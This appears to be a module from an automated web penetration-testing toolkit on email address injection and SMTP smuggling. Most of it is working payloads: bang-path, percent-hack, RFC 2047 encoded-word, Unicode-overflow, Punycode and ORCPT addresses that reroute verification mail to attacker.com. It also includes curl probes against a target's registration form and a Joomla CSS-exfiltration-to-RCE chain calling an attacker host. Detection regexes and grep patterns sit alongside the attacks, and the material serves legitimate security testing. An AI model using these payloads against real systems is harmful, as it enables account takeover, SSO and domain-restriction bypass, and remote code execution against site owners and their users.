# VULN MODULE — Email Address Injection & SMTP Smuggling
# Asset: webapp
# CWE-20 / CWE-116 | Report prefix: WEB-EMAIL
# See also: auth_flaws.md (account takeover), ssrf_filter_evasion.md (SSRF chains)

## THREAT MODEL

Email address parsing is inconsistent across validators, SMTP servers, and mailers.
An attacker-supplied email that passes front-end validation may be routed by the SMTP
server to a completely different address — enabling:

- **Account takeover** via email verification bypass (receive victim's verification link)
- **Identity spoofing** in SSO / Cloudflare Zero Trust / GitHub IdP chains
- **Privilege escalation** by registering as a domain-restricted corporate address
- **CSS/HTML injection** via Punycode malformation → XSS in admin panels
- **RCE** via CSS injection chained to CSRF token theft (see Joomla CVE-2024-21725)

Key principle: the browser/validator sees one email, the SMTP server routes to another.

---

## DETECTION METHODOLOGY (POEE Framework)

1. **Probe** — Register/send with payloads to a Burp Collaborator/interactsh endpoint
2. **Observe** — Monitor the Collaborator SMTP listener — what address did the server RCPT TO?
3. **Encode** — Test character generation techniques to produce `@`, `.`, `<`, `>`
4. **Exploit** — Deploy domain-spoofing payloads against real targets

---

## 1. UUCP / BANG PATH EXPLOITATION

UUCP used `!` as a domain separator (`host!user` notation). Some MTAs still honor this.

```
# Sendmail 8.15.2: routes oastify.com!collab\@example.com → to collab@oastify.com
oastify.com!collab\@example.com

# With special chars in local part
!#$%&'*+\/=?^_`{|}~-collab\@target.com

# Encoded-word + comment variant
"psres.net!collab"(\"@example.com
```

**Effect:** Sendmail resolves the bang path and delivers to the attacker-controlled domain.

---

## 2. PERCENT HACK (SOURCE ROUTES)

The `%` character was historically used as a relay separator. Some MTAs still convert
`foo%domain@host` → `foo@domain` and forward there.

```
# Postfix: converts collab%attacker.com@[127.0.0.1] → delivers to collab@attacker.com
collab%attacker.com@[127.0.0.1]

# Standard percent-hack form
foo%attacker.com@legitimate.com
collab%attacker.com(@legitimate.com
```

---

## 3. ENCODED-WORD (RFC 2047) — PRIMARY TECHNIQUE

RFC 2047 defines encoded-word format for non-ASCII in headers:
```
=?[charset]?[encoding]?[data]?=
```
- **Q-encoding:** hex with `=` prefix (e.g., `=40` = `@`, `=2E` = `.`)
- **B-encoding:** Base64

### Detection probes (send to Collaborator SMTP endpoint)
```
=?x?q?=41=42=43collab=40attacker=2Enet?=@legitimate.com
=?iso-8859-1?q?=41=42=43collab=40attacker=2Enet?=@legitimate.com
```
If Collaborator receives `ABCcollab@attacker.net` → target is vulnerable.

### Null byte RCPT TO smuggling (GitHub bypass)
```
=?x?q?=41=42=43collab=40attacker=2Enet=3efoo=00?=@example.com
```
Decoded: `=3e` = `>` closes the RCPT TO angle bracket; `=00` = null byte terminates command.
SMTP server sees: `RCPT TO:<` then routes to the embedded `collab@attacker.net`.

### Space-based RCPT splitting (Zendesk / GitLab)
```
# =3e=20 → "> " — space after > ends RCPT TO command
=?x?q?=41=42=43collab=40attacker=2Enet=3e=20?=@attacker.net

# Underscore = space in Q-encoding (RFC 2047)
=?iso-8859-1?q?user_@attacker=2Ecom?=@legitimate.com
=?iso-8859-1?q?user=20@attacker=2Ecom?=@legitimate.com
```

### UTF-7 variant
```
=?utf-7?q?[UTF-7 encoded payload]?=@legitimate.com
=?utf-7?b?[base64 UTF-7 payload]?=@legitimate.com
```

### Detection regex (block encoded-word in email fields)
```
=[?].+[?]=
```

---

## 4. UNICODE OVERFLOW (MODULO 256)

High codepoint Unicode characters can overflow modulo 256 to produce ASCII characters.
Validators that accept Unicode may pass characters that MTAs interpret as special bytes.

```
'❀'.codePointAt(0) % 256 === 0x40   // ❀ → @
'✻'.codePointAt(0) % 256 === 0x3B   // ✻ → ;
'✼'.codePointAt(0) % 256 === 0x3C   // ✼ → <
'✽'.codePointAt(0) % 256 === 0x3D   // ✽ → =
'✾'.codePointAt(0) % 256 === 0x3E   // ✾ → >
'✨'.codePointAt(0) % 256 === 0x28   // ✨ → (
'✩'.codePointAt(0) % 256 === 0x29   // ✩ → )
```

**Attack:** Replace `@`, `.`, `<`, `>` in a payload with their Unicode overflow equivalents.
The validator accepts it (valid Unicode email), the MTA's string processing overflows back.

---

## 5. PUNYCODE MALFORMATION (IDN LIBRARY BUGS)

The `IdnaConvert` PHP library (used in many CMSes including Joomla) incorrectly decodes
certain Punycode labels, generating arbitrary ASCII characters.

### Character generation via xn-- labels
```
x@xn--0117.example.com   →  x@@.example.com   (generates @)
x@xn--024.example.com    →  x@@               (generates @)
x@xn--694.example.com    →  x@;               (generates ;)
x@xn--svg/-9x6.example.com → x@<svg/          (generates HTML!)
```

### Testing approach
```bash
# Fuzz xn-- labels with random character/number substitution
# Pattern: xn--[chars][digits] — iterate to find unexpected output
# Match output with regex: [@;<>\"']
for i in $(seq 0 9999); do
  label="xn--$(printf '%04x' $i)"
  echo "x@${label}.example.com"
done | while read addr; do
  decoded=$(php -r "require 'idna_convert.class.php'; echo (new Net_IDNA2)->decode('$addr');")
  echo "$decoded" | grep -P '[@;<>"\x00-\x1f]' && echo "HIT: $addr"
done
```

### Joomla RCE chain (CVE-2024-21725)
1. Register with Punycode email that decodes to a `<style` tag fragment
2. First/last name fields contain `@import url('http://attacker.com/exfil.css')` rule body
3. CSS exfiltration extracts admin CSRF token
4. CSRF token used to inject PHP code in admin template → RCE

---

## 6. ORCPT PARAMETER SMUGGLING (POSTFIX)

Abuses quoted local-parts with escaped backslashes to inject optional SMTP parameters.

```
"foo\\"@attacker.com> ORCPT=test;admin"@legitimate.com
```

The `\"` manipulation closes the angle bracket early, allowing injection of the `ORCPT`
parameter which influences mail delivery routing in Postfix.

---

## WHITEBOX GREP PATTERNS

```bash
# Email validation libraries — check if they use RFC-compliant parsers
grep -rn "filter_var.*FILTER_VALIDATE_EMAIL\|egulias/email-validator\|EmailValidator" --include="*.php"
grep -rn "email.*validate\|validate.*email\|EmailField\|EmailType" --include="*.py" --include="*.php"

# SMTP mailer libraries — identify which one sends (affects routing)
grep -rn "PHPMailer\|SwiftMailer\|Symfony\\\\Mailer\|sendmail\|Postfix" --include="*.php" --include="*.py"
grep -rn "nodemailer\|sendgrid\|ses\.sendEmail\|mailgun" --include="*.js" --include="*.ts"

# Email verification / confirmation flows
grep -rn "verify.*email\|email.*verif\|confirm.*email\|email.*confirm" \
  --include="*.php" --include="*.py" --include="*.js" --include="*.ts" -i

# Encoded-word in existing email processing
grep -rn "=?.*?=" --include="*.php" --include="*.py" --include="*.js"

# IDNA / Punycode conversion (vulnerable libraries)
grep -rn "IdnaConvert\|idna_convert\|Net_IDNA\|idn_to_ascii\|idn_to_utf8" --include="*.php"
grep -rn "encodings.idna\|encodings.idna2003\|idna\." --include="*.py"
```

---

## TESTING PROCEDURE

### Step 1 — Identify email input surfaces
- Registration form
- Email update / change email
- Password reset ("send link to email")
- SSO login with email domain restriction
- Contact/support form

### Step 2 — Send detection probes to Collaborator
```bash
COLLAB="your.burpcollaborator.net"

# Encoded-word probe
curl -s -X POST "https://target.com/register" \
  -d "email==?x?q?collab=40${COLLAB}?=@legitimate.com&password=Test1234!"

# Percent-hack probe
curl -s -X POST "https://target.com/register" \
  -d "email=collab%${COLLAB}@legitimate.com&password=Test1234!"

# Bang-path probe
curl -s -X POST "https://target.com/register" \
  -d "email=${COLLAB}!collab\@legitimate.com&password=Test1234!"
```

### Step 3 — Monitor Collaborator SMTP interactions
- Check which RCPT TO address the SMTP server used
- If it resolves to your Collaborator → vulnerable
- Note the validation vs delivery gap

### Step 4 — Exploit domain restriction bypass
If target restricts registration to `@corporate.com` emails:
```
=?iso-8859-1?q?collab=40attacker=2Ecom?=@corporate.com
```
If validator accepts (it's `...@corporate.com`), but SMTP delivers to `collab@attacker.com` →
you receive the verification link → account created as `@corporate.com` user.

---

## SCOPE AND IMPACT

| Scenario | Severity |
|----------|----------|
| Receive verification email for victim's domain (SSO bypass) | Critical |
| Register as `@corporate.com` user without owning that domain | High |
| SMTP RCPT TO smuggling → deliver to arbitrary attacker address | High |
| Punycode CSS injection in admin panel → XSS | High |
| Punycode CSS injection chained to CSRF → RCE (CVE-2024-21725 pattern) | Critical |
| Email validation bypass without actual delivery impact | Low/Info |

---

## AUTO-LOAD TRIGGERS

Load this module automatically when:
- Registration/email-update endpoint with domain-restriction logic found
- SMTP mailer libraries detected in source (PHPMailer, SwiftMailer, nodemailer)
- SSO or email-based IdP restriction (Cloudflare Access, GitHub Enterprise, Okta) present
- `IdnaConvert` / `Net_IDNA` PHP library found in dependencies
- Email verification flow identified in blackbox recon
